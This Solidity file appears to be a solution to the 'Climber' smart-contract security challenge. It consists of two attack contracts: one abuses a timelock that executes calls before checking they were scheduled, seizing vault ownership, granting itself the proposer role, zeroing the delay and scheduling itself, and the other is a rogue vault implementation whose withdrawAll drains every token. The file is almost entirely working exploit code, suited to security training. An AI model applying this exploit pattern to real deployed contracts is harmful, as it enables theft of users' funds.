// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {PROPOSER_ROLE} from "@main/climber/ClimberConstants.sol";

import {ClimberVault} from "@main/climber/ClimberVault.sol";
import {ClimberTimelock} from "@main/climber/ClimberTimelock.sol";

contract ClimberAttackerVaultImp is ClimberVault {
    // constructor() initializer {}

    function withdrawAll(address token) external onlyOwner {
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberScheduler {
    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt)
        external
    {
        // Recreate the scheduled operation from the attacker contract and call the vault
        // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
        // This is leveraging the existing re-entrancy exploit in `execute`
        ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory data = new bytes[](4);

        // transfer the ownership of the Vault contract to the attacker
        targets[0] = vaultAddress;
        values[0] = 0;
        data[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        //  grant the role address to an external contract
        targets[1] = vaultTimelockAddress;
        values[1] = 0;
        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // update the delay
        targets[2] = vaultTimelockAddress;
        values[2] = 0;
        data[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // schedule the proposal
        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSignature(
            "scheduleOperation(address,address,address,bytes32)", attacker, vaultAddress, vaultTimelockAddress, salt
        );

        vaultTimelock.schedule(targets, values, data, salt);
    }
}
